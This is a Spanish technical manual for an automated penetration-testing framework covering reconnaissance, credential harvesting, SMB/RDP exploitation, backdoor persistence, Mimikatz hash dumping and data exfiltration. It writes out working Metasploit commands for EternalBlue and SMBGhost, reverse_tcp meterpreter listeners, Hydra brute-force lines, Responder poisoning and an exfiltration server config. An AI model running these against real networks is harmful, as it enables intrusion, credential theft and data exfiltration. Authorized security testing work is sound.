# Manual Técnico - Sistema de Automatización de Pruebas de Penetración

## Tabla de Contenidos

1. [Introducción](#introducción)
2. [Arquitectura del Sistema](#arquitectura-del-sistema)
3. [Módulos Detallados](#módulos-detallados)
4. [Configuración Avanzada](#configuración-avanzada)
5. [API y Extensibilidad](#api-y-extensibilidad)
6. [Troubleshooting Avanzado](#troubleshooting-avanzado)
7. [Casos de Uso](#casos-de-uso)
8. [Referencias Técnicas](#referencias-técnicas)

## Introducción

Este manual técnico proporciona información detallada sobre el funcionamiento interno del sistema de automatización de pruebas de penetración, incluyendo arquitectura, implementación y casos de uso avanzados.

## Arquitectura del Sistema

### Diseño Modular

El sistema está diseñado con una arquitectura modular que permite:

- **Separación de responsabilidades**: Cada módulo maneja una fase específica
- **Reutilización de código**: Componentes comunes compartidos
- **Mantenibilidad**: Fácil actualización y modificación
- **Extensibilidad**: Adición de nuevos módulos sin afectar existentes

### Flujo de Datos

```
Configuración → Módulo Principal → Módulos Específicos → Sistema de Logging → Reportes
     ↓              ↓                    ↓                    ↓              ↓
  config.json  pentest_automation.py  modules/*.py    logging_system.py  reports/
```

### Componentes Principales

1. **Script Principal** (`pentest_automation.py`)
   - Orquestador general
   - Manejo de configuración
   - Control de flujo entre módulos
   - Generación de reportes

2. **Sistema de Logging** (`modules/logging_system.py`)
   - Logging estructurado
   - Manejo de evidencia
   - Generación de reportes por fase

3. **Módulos de Ataque** (`modules/*.py`)
   - Implementación de técnicas específicas
   - Interfaz estandarizada
   - Manejo de errores robusto

## Módulos Detallados

### 1. Módulo de Reconocimiento (`modules/reconnaissance.py`)

#### Funcionalidades Principales

**Descubrimiento de Red**
```python
def discover_network_info(self) -> Dict[str, Any]:
    """Descubre información básica de la red"""
    # Obtiene IP local, máscara de subred, router
    # Detecta automáticamente la puerta de enlace
    # Configura parámetros de red
```

**Escaneo de Hosts**
```python
def arp_scan(self) -> List[Dict[str, Any]]:
    """Escaneo ARP para descubrir hosts activos"""
    # Usa arp-scan para descubrimiento rápido
    # Extrae MAC addresses y vendors
    # Filtra hosts válidos
```

**Escaneo de Puertos**
```python
def nmap_port_scan(self, hosts: List[str]) -> List[Dict[str, Any]]:
    """Escaneo de puertos con nmap"""
    # Escaneo SYN stealth
    # Detección de servicios
    # Enumeración básica
```

#### Técnicas Implementadas

1. **ARP Scanning**
   - Descubrimiento rápido de hosts
   - Identificación de vendors
   - Detección de dispositivos activos

2. **Nmap Scanning**
   - Escaneo de ping (-sn)
   - Escaneo de puertos (-sS)
   - Detección de servicios (-sV)

3. **Masscan Scanning**
   - Escaneo de alta velocidad
   - Escaneo de todos los puertos
   - Configuración de rate limiting

4. **Traceroute**
   - Mapeo de rutas de red
   - Identificación de saltos
   - Análisis de latencia

#### Configuración Específica

```json
{
  "network_config": {
    "target_network": "192.168.1.0/24",
    "interface": "eth0",
    "scan_rate": 10000,
    "timeout": 30
  }
}
```

### 2. Módulo de Recolección de Credenciales (`modules/credential_harvesting.py`)

#### Funcionalidades Principales

**LLMNR/NBT-NS Spoofing**
```python
def start_responder(self) -> bool:
    """Inicia Responder para captura de credenciales"""
    # Configura interfaz de red
    # Inicia captura pasiva
    # Maneja múltiples protocolos
```

**Ataques de Fuerza Bruta**
```python
def brute_force_attack(self, targets: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """Realiza ataques de fuerza bruta"""
    # Usa Hydra para múltiples servicios
    # Configura timeouts y threads
    # Maneja diferentes protocolos
```

**Verificación de Credenciales por Defecto**
```python
def check_default_credentials(self, targets: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """Verifica credenciales por defecto"""
    # Lista de credenciales comunes
    # Pruebas automatizadas
    # Validación de acceso
```

#### Técnicas Implementadas

1. **Responder**
   - LLMNR spoofing
   - NBT-NS spoofing
   - Captura de hashes NTLMv2

2. **Hydra**
   - Fuerza bruta SSH
   - Fuerza bruta FTP
   - Fuerza bruta SMB
   - Fuerza bruta HTTP
   - Fuerza bruta RDP

3. **Sniffing de Tráfico**
   - Captura con tcpdump
   - Filtrado por puertos
   - Análisis de protocolos

#### Configuración Específica

```json
{
  "credentials": {
    "default_users": ["admin", "administrator", "root"],
    "default_passwords": ["admin", "password", "123456"],
    "password_lists": ["/usr/share/wordlists/rockyou.txt"]
  }
}
```

### 3. Módulo de Movimiento Lateral (`modules/lateral_movement.py`)

#### Funcionalidades Principales

**Acceso a SMB**
```python
def access_smb_shares(self, targets: List[Dict[str, Any]], credentials: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """Accede a recursos compartidos SMB"""
    # Enumeración de shares
    # Acceso anónimo y autenticado
    # Análisis de permisos
```

**Explotación de Vulnerabilidades**
```python
def exploit_smb_vulnerabilities(self, targets: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """Explota vulnerabilidades SMB conocidas"""
    # EternalBlue (MS17-010)
    # SMBGhost (CVE-2020-0796)
    # BlueKeep (CVE-2019-0708)
```

**Explotación Web**
```python
def exploit_web_vulnerabilities(self, targets: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """Explota vulnerabilidades en servicios web"""
    # Tomcat Manager Upload
    # Apache Struts RCE
    # Jenkins RCE
```

#### Técnicas Implementadas

1. **EternalBlue (MS17-010)**
   - Exploit de SMBv1
   - Ejecución remota de código
   - Payload Meterpreter

2. **SMBGhost (CVE-2020-0796)**
   - Buffer overflow en SMBv3
   - Explotación de Windows 10/Server 2019

3. **BlueKeep (CVE-2019-0708)**
   - RCE en RDP
   - Explotación sin autenticación

4. **Tomcat Manager Upload**
   - Subida de archivos WAR
   - Ejecución de código Java

#### Configuración Específica

```json
{
  "exploitation": {
    "metasploit_path": "/usr/share/metasploit-framework",
    "payloads": {
      "windows": "windows/meterpreter/reverse_tcp",
      "linux": "linux/x86/meterpreter/reverse_tcp"
    },
    "lhost": "192.168.1.50",
    "lport": 4444
  }
}
```

### 4. Módulo de Persistencia (`modules/persistence.py`)

#### Funcionalidades Principales

**Instalación de Backdoors**
```python
def install_backdoors(self, compromised_systems: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """Instala backdoors en sistemas comprometidos"""
    # Backdoor netcat
    # Backdoor PowerShell
    # Backdoor Python
```

**Tareas Programadas**
```python
def create_scheduled_tasks(self, compromised_systems: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """Crea tareas programadas para persistencia"""
    # Tareas de Windows
    # Cron jobs de Linux
    # Configuración automática
```

**Modificación del Registro**
```python
def modify_registry(self, compromised_systems: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """Modifica registro de Windows"""
    # Claves de inicio automático
    # Configuración de servicios
    # Persistencia avanzada
```

#### Técnicas Implementadas

1. **Backdoors**
   - Netcat reverse shell
   - PowerShell backdoor
   - Python backdoor

2. **Tareas Programadas**
   - Windows Task Scheduler
   - Linux cron jobs
   - Inicio automático

3. **Modificaciones del Sistema**
   - Registro de Windows
   - Archivos de configuración
   - Servicios del sistema

#### Configuración Específica

```json
{
  "persistence": {
    "backdoor_ports": [4444, 5555, 6666],
    "scheduled_tasks": true,
    "registry_modifications": true
  }
}
```

### 5. Módulo de Escalada de Privilegios (`modules/privilege_escalation.py`)

#### Funcionalidades Principales

**Dump de Hashes**
```python
def dump_hashes_with_mimikatz(self, compromised_systems: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """Extrae hashes con Mimikatz"""
    # Dump de SAM
    # Dump de LSA
    # Extracción de credenciales
```

**Enumeración con CrackMapExec**
```python
def crackmapexec_enumeration(self, compromised_systems: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """Enumera información con CrackMapExec"""
    # Enumeración de usuarios
    # Enumeración de grupos
    # Enumeración de shares
```

**Técnicas de Escalada**
```python
def privilege_escalation_techniques(self, compromised_systems: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """Aplica técnicas de escalada de privilegios"""
    # Exploits de kernel
    # Configuraciones incorrectas
    # Permisos débiles
```

#### Técnicas Implementadas

1. **Mimikatz**
   - Dump de credenciales
   - Extracción de hashes
   - Pass-the-hash

2. **CrackMapExec**
   - Enumeración de AD
   - Lateral movement
   - Credential dumping

3. **Escalada de Privilegios**
   - Kernel exploits
   - SUID binaries
   - Sudo misconfigurations

### 6. Módulo de Exfiltración (`modules/exfiltration.py`)

#### Funcionalidades Principales

**Recopilación de Datos**
```python
def collect_sensitive_data(self, compromised_systems: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """Recopila datos sensibles"""
    # Datos de usuario
    # Datos del sistema
    # Datos de red
    # Datos de aplicaciones
```

**Compresión y Encriptación**
```python
def compress_data(self, collected_data: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """Comprime datos recopilados"""
    # Compresión ZIP
    # Encriptación XOR
    # Optimización de tamaño
```

**Exfiltración**
```python
def exfiltrate_data(self, data_files: List[str]) -> List[Dict[str, Any]]:
    """Exfiltra datos a servidor remoto"""
    # Transferencia SCP
    # Validación de integridad
    # Logging de transferencias
```

#### Técnicas Implementadas

1. **Recopilación de Datos**
   - Archivos de usuario
   - Configuraciones del sistema
   - Logs de aplicaciones
   - Bases de datos

2. **Compresión**
   - ZIP con compresión máxima
   - Eliminación de duplicados
   - Optimización de estructura

3. **Exfiltración**
   - SCP/SFTP
   - HTTP POST
   - DNS tunneling (futuro)

#### Configuración Específica

```json
{
  "exfiltration": {
    "remote_server": "192.168.1.200",
    "remote_user": "pentest",
    "remote_path": "/tmp/exfiltrated_data",
    "compression": true,
    "encryption": false
  }
}
```

## Configuración Avanzada

### Variables de Entorno

```bash
# Configuración de red
export PENTEST_INTERFACE=eth0
export PENTEST_TARGET_NETWORK=192.168.1.0/24

# Configuración de Metasploit
export MSF_DATABASE_CONFIG=/opt/metasploit/database.yml
export MSF_LOGFILE=/var/log/metasploit.log

# Configuración de logging
export PENTEST_LOG_LEVEL=DEBUG
export PENTEST_LOG_FILE=/var/log/pentest.log
```

### Configuración de Herramientas

#### Metasploit
```bash
# Inicializar base de datos
sudo msfdb init

# Configurar workspace
msfconsole -q -x "workspace -a pentest_automation; exit"

# Configurar listeners
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.1.50; set LPORT 4444; exploit -j; exit"
```

#### Responder
```bash
# Configurar Responder
sudo responder -I eth0 -wrf -v

# Configurar archivo de configuración
sudo nano /etc/responder/Responder.conf
```

#### Hydra
```bash
# Configurar listas de contraseñas
sudo cp /usr/share/wordlists/rockyou.txt /opt/pentest/wordlists/
sudo chmod 644 /opt/pentest/wordlists/rockyou.txt
```

### Configuración de Red

#### Configuración de Interfaz
```bash
# Configurar interfaz en modo promiscuo
sudo ip link set eth0 promisc on

# Configurar IP estática
sudo ip addr add 192.168.1.50/24 dev eth0
sudo ip route add default via 192.168.1.1
```

#### Configuración de Firewall
```bash
# Permitir tráfico de Metasploit
sudo ufw allow 4444/tcp
sudo ufw allow 5555/tcp
sudo ufw allow 6666/tcp

# Permitir tráfico de Responder
sudo ufw allow 53/udp
sudo ufw allow 137/udp
sudo ufw allow 138/udp
```

## API y Extensibilidad

### Interfaz de Módulos

Todos los módulos implementan la siguiente interfaz:

```python
class BaseModule:
    def __init__(self, config: Dict[str, Any], logger):
        self.config = config
        self.logger = logger
        self.logging_system = LoggingSystem(config, logger)
        self.results = {}
    
    def run(self) -> Dict[str, Any]:
        """Ejecuta el módulo y retorna resultados"""
        pass
    
    def _run_command(self, command: List[str], timeout: int = 300) -> Dict[str, Any]:
        """Ejecuta comando y captura salida"""
        pass
```

### Crear Nuevo Módulo

```python
from modules.logging_system import LoggingSystem

class CustomModule:
    def __init__(self, config: Dict[str, Any], logger):
        self.config = config
        self.logger = logger
        self.logging_system = LoggingSystem(config, logger)
        self.results = {}
    
    def run(self) -> Dict[str, Any]:
        """Implementar lógica del módulo"""
        self.logger.info("Ejecutando módulo personalizado")
        
        # Lógica específica aquí
        
        return self.results
```

### Extensión del Sistema de Logging

```python
# Agregar nuevo tipo de evento
self.logging_system.log_event(
    "CUSTOM_EVENT",
    "Descripción del evento personalizado",
    {"custom_data": "valor"},
    "CUSTOM_PHASE"
)

# Crear logger personalizado
custom_logger = self.logging_system.get_logger("CustomModule")
custom_logger.info("Mensaje personalizado")
```

## Troubleshooting Avanzado

### Problemas de Red

#### Interfaz no disponible
```bash
# Verificar interfaces
ip link show

# Verificar estado
ip addr show

# Reiniciar interfaz
sudo ip link set eth0 down
sudo ip link set eth0 up
```

#### Problemas de conectividad
```bash
# Verificar routing
ip route show

# Verificar DNS
nslookup google.com

# Verificar conectividad
ping -c 4 8.8.8.8
```

### Problemas de Herramientas

#### Metasploit no responde
```bash
# Verificar estado de la base de datos
sudo msfdb status

# Reiniciar servicios
sudo systemctl restart postgresql
sudo msfdb init

# Verificar configuración
sudo msfconsole -q -x "db_status; exit"
```

#### Responder no captura credenciales
```bash
# Verificar interfaz
sudo responder -I eth0 -wrf -v

# Verificar logs
sudo tail -f /usr/share/responder/logs/Responder-Session.log

# Verificar configuración
sudo cat /etc/responder/Responder.conf
```

#### Hydra falla en ataques
```bash
# Verificar conectividad
telnet target_ip port

# Verificar credenciales
hydra -l admin -p admin target_ip service

# Verificar timeouts
hydra -l admin -p admin -t 4 target_ip service
```

### Problemas de Permisos

#### Permisos insuficientes
```bash
# Verificar permisos de usuario
id

# Verificar grupos
groups

# Agregar a grupos necesarios
sudo usermod -aG wireshark $USER
sudo usermod -aG docker $USER
```

#### Problemas de sudo
```bash
# Configurar sudo sin contraseña para herramientas específicas
echo "$USER ALL=(ALL) NOPASSWD: /usr/bin/nmap, /usr/bin/masscan" | sudo tee /etc/sudoers.d/pentest

# Verificar configuración
sudo -l
```

### Problemas de Rendimiento

#### Escaneos lentos
```bash
# Ajustar rate limiting
masscan -p0-65535 192.168.1.0/24 --rate=5000

# Usar menos threads
hydra -l admin -p admin -t 2 target_ip service

# Ajustar timeouts
nmap -T4 --max-retries 1 target_ip
```

#### Memoria insuficiente
```bash
# Verificar uso de memoria
free -h

# Ajustar límites de proceso
ulimit -v 2097152  # 2GB

# Usar swap si es necesario
sudo swapon /swapfile
```

## Casos de Uso

### Caso 1: Prueba de Penetración Interna Completa

**Objetivo**: Evaluar la seguridad de una red interna completa

**Configuración**:
```json
{
  "network_config": {
    "target_network": "192.168.1.0/24",
    "interface": "eth0"
  },
  "safety": {
    "dry_run": false,
    "confirm_actions": true
  }
}
```

**Ejecución**:
```bash
python3 pentest_automation.py
```

**Resultados Esperados**:
- Descubrimiento de todos los hosts
- Identificación de servicios vulnerables
- Compromiso de sistemas objetivo
- Escalada de privilegios
- Exfiltración de datos

### Caso 2: Prueba de Penetración de Servicios Web

**Objetivo**: Evaluar la seguridad de servicios web específicos

**Configuración**:
```json
{
  "targets": {
    "common_ports": [80, 443, 8080, 8443]
  },
  "exploitation": {
    "focus_web": true
  }
}
```

**Ejecución**:
```bash
python3 pentest_automation.py -p lateral
```

### Caso 3: Prueba de Penetración de Active Directory

**Objetivo**: Evaluar la seguridad de un dominio de Active Directory

**Configuración**:
```json
{
  "credentials": {
    "default_users": ["administrator", "admin", "guest"],
    "default_passwords": ["Password123", "admin", "password"]
  },
  "exploitation": {
    "focus_ad": true
  }
}
```

**Ejecución**:
```bash
python3 pentest_automation.py -p priv
```

### Caso 4: Prueba de Penetración de Red Industrial

**Objetivo**: Evaluar la seguridad de una red SCADA/Industrial

**Configuración**:
```json
{
  "targets": {
    "common_ports": [502, 102, 44818, 47808, 20000]
  },
  "safety": {
    "dry_run": true,
    "confirm_actions": true
  }
}
```

**Ejecución**:
```bash
python3 pentest_automation.py --dry-run
```

## Referencias Técnicas

### Herramientas Utilizadas

1. **nmap**
   - Documentación: https://nmap.org/book/
   - Opciones: `-sS`, `-sV`, `-O`, `-A`

2. **masscan**
   - Documentación: https://github.com/robertdavidgraham/masscan
   - Opciones: `--rate`, `-p`, `--banners`

3. **Hydra**
   - Documentación: https://github.com/vanhauser-thc/thc-hydra
   - Opciones: `-L`, `-P`, `-t`, `-f`

4. **Metasploit**
   - Documentación: https://docs.metasploit.com/
   - Exploits: EternalBlue, SMBGhost, BlueKeep

5. **Responder**
   - Documentación: https://github.com/lgandx/Responder
   - Opciones: `-I`, `-w`, `-r`, `-f`

6. **CrackMapExec**
   - Documentación: https://github.com/byt3bl33d3r/CrackMapExec
   - Opciones: `--users`, `--groups`, `--shares`

### Protocolos y Puertos

| Puerto | Protocolo | Servicio | Vulnerabilidades |
|--------|-----------|----------|------------------|
| 21 | TCP | FTP | Fuerza bruta, credenciales por defecto |
| 22 | TCP | SSH | Fuerza bruta, claves débiles |
| 23 | TCP | Telnet | Credenciales en texto plano |
| 25 | TCP | SMTP | Relay, enumeración de usuarios |
| 53 | UDP | DNS | Cache poisoning, zone transfer |
| 80 | TCP | HTTP | Inyección, XSS, CSRF |
| 110 | TCP | POP3 | Fuerza bruta, credenciales por defecto |
| 135 | TCP | RPC | Enumeración, exploits |
| 139 | TCP | NetBIOS | Enumeración, fuerza bruta |
| 143 | TCP | IMAP | Fuerza bruta, credenciales por defecto |
| 443 | TCP | HTTPS | Inyección, XSS, CSRF |
| 445 | TCP | SMB | EternalBlue, SMBGhost |
| 993 | TCP | IMAPS | Fuerza bruta, credenciales por defecto |
| 995 | TCP | POP3S | Fuerza bruta, credenciales por defecto |
| 1433 | TCP | MSSQL | Fuerza bruta, inyección SQL |
| 3389 | TCP | RDP | BlueKeep, fuerza bruta |
| 5432 | TCP | PostgreSQL | Fuerza bruta, inyección SQL |
| 5900 | TCP | VNC | Fuerza bruta, credenciales por defecto |
| 8080 | TCP | HTTP-Alt | Inyección, XSS, CSRF |

### CVE y Vulnerabilidades

| CVE | Descripción | Exploit | Impacto |
|-----|-------------|---------|---------|
| CVE-2017-0144 | EternalBlue | MS17-010 | RCE |
| CVE-2020-0796 | SMBGhost | SMBv3 | RCE |
| CVE-2019-0708 | BlueKeep | RDP | RCE |
| CVE-2017-12615 | Tomcat Manager | Upload | RCE |
| CVE-2017-5638 | Apache Struts | OGNL | RCE |
| CVE-2017-1000353 | Jenkins | Script Console | RCE |

### Comandos de Referencia

#### nmap
```bash
# Escaneo de ping
nmap -sn 192.168.1.0/24

# Escaneo de puertos
nmap -sS -p 1-65535 192.168.1.100

# Escaneo de servicios
nmap -sV -sC 192.168.1.100

# Escaneo de OS
nmap -O 192.168.1.100
```

#### Hydra
```bash
# Fuerza bruta SSH
hydra -l admin -P passwords.txt ssh://192.168.1.100

# Fuerza bruta FTP
hydra -L users.txt -P passwords.txt ftp://192.168.1.100

# Fuerza bruta SMB
hydra -l admin -P passwords.txt smb://192.168.1.100
```

#### Metasploit
```bash
# EternalBlue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
exploit

# SMBGhost
use exploit/windows/smb/cve_2020_0796_smbghost
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
exploit
```

#### Responder
```bash
# Iniciar Responder
responder -I eth0 -wrf

# Configurar archivo
nano /etc/responder/Responder.conf
```

#### CrackMapExec
```bash
# Enumerar usuarios
crackmapexec smb 192.168.1.100 --users

# Enumerar grupos
crackmapexec smb 192.168.1.100 --groups

# Enumerar shares
crackmapexec smb 192.168.1.100 --shares
```

---

Este manual técnico proporciona la información necesaria para entender, configurar y utilizar el sistema de automatización de pruebas de penetración de manera efectiva y segura.
